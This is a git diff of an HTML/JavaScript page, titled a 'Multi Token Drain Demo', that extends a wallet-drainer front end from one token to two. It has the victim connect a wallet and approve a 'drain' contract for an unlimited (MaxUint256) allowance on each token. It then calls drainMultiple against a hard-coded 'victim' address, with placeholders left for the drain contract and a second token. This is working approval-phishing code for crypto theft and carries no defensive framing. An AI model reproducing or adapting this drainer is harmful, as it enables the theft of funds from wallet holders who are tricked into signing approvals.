@@ -1,23 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Approval Demo</title>
+  <title>Multi Token Drain Demo</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 
 <body style="font-family:sans-serif">
 
-<h2>Demo: Connect → Approve → Drain</h2>
+<h2>Demo: Connect → Approve → Drain Multiple</h2>
 
 <button onclick="connect()">Connect Wallet</button><br><br>
-<button onclick="approve()">Approve Token</button><br><br>
-<button onclick="drain()">Drain Tokens</button>
+
+<button onclick="approveTokenA()">Approve Token A</button><br><br>
+<button onclick="approveTokenB()">Approve Token B</button><br><br>
+
+<button onclick="drainAll()">💣 Drain All Tokens</button>
 
 <script>
 let provider, signer, userAddress;
 
-const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
-const drainAddress = "0x0ccb058f48f5caa16c7026e7d34c103544c2d172";
+// 🔁 TOKEN ADDRESSES
+const tokenA = "0x089d6677646bc535B1A8535ED856bb17493E332d";
+const tokenB = "PASTE_TOKEN_B_ADDRESS_HERE";
+
+// 🔁 DRAIN CONTRACT
+const drainAddress = "PASTE_DRAIN_MULTI_CONTRACT";
+
+// 🔁 VICTIM
 const victimAddress = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";
 
 const tokenABI = [
@@ -25,15 +34,8 @@ const tokenABI = [
 ];
 
 const drainABI = [
-  "function drain(address token, address victim, uint256 amount) public"
+  "function drainMultiple(address[] memory tokens, address victim) public"
 ];
-
-// 🔁 Handle network change safely
-if (window.ethereum) {
-  window.ethereum.on("chainChanged", () => {
-    console.log("Network changed");
-  });
-}
 
 // CONNECT
 async function connect() {
@@ -45,11 +47,9 @@ async function connect() {
 
     await window.ethereum.request({ method: "eth_requestAccounts" });
 
-    // ✅ Use "any" to allow network switching
     provider = new ethers.providers.Web3Provider(window.ethereum, "any");
     signer = provider.getSigner();
 
-    // Sync network
     await provider.getNetwork();
 
     userAddress = await signer.getAddress();
@@ -57,23 +57,19 @@ async function connect() {
     alert("✅ Connected: " + userAddress);
 
   } catch (e) {
-    console.error(e);
     alert("❌ Connect error: " + e.message);
   }
 }
 
-// APPROVE
-async function approve() {
+// APPROVE TOKEN A
+async function approveTokenA() {
   try {
     if (!signer) {
       alert("Connect wallet first");
       return;
     }
 
-    // 🔥 Re-sync network before tx
-    await provider.getNetwork();
-
-    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
+    const contract = new ethers.Contract(tokenA, tokenABI, signer);
 
     const tx = await contract.approve(
       drainAddress,
@@ -82,39 +78,58 @@ async function approve() {
 
     await tx.wait();
 
-    alert("✅ Approved successfully");
+    alert("✅ Token A Approved");
 
   } catch (e) {
-    console.error(e);
-    alert("❌ Approve error: " + e.message);
+    alert("❌ Error: " + e.message);
   }
 }
 
-// DRAIN
-async function drain() {
+// APPROVE TOKEN B
+async function approveTokenB() {
   try {
     if (!signer) {
       alert("Connect wallet first");
       return;
     }
 
-    // 🔥 Re-sync network before tx
-    await provider.getNetwork();
+    const contract = new ethers.Contract(tokenB, tokenABI, signer);
 
-    const contract = new ethers.Contract(drainAddress, drainABI, signer);
-
-    const tx = await contract.drain(
-      tokenAddress,
-      victimAddress,
-      ethers.utils.parseUnits("1000", 18)
+    const tx = await contract.approve(
+      drainAddress,
+      ethers.constants.MaxUint256
     );
 
     await tx.wait();
 
-    alert("💣 Drain executed");
+    alert("✅ Token B Approved");
 
   } catch (e) {
-    console.error(e);
+    alert("❌ Error: " + e.message);
+  }
+}
+
+// DRAIN ALL
+async function drainAll() {
+  try {
+    if (!signer) {
+      alert("Connect wallet first");
+      return;
+    }
+
+    await provider.getNetwork();
+
+    const contract = new ethers.Contract(drainAddress, drainABI, signer);
+
+    const tokens = [tokenA, tokenB];
+
+    const tx = await contract.drainMultiple(tokens, victimAddress);
+
+    await tx.wait();
+
+    alert("💣 All tokens drained");
+
+  } catch (e) {
     alert("❌ Drain error: " + e.message);
   }
 }
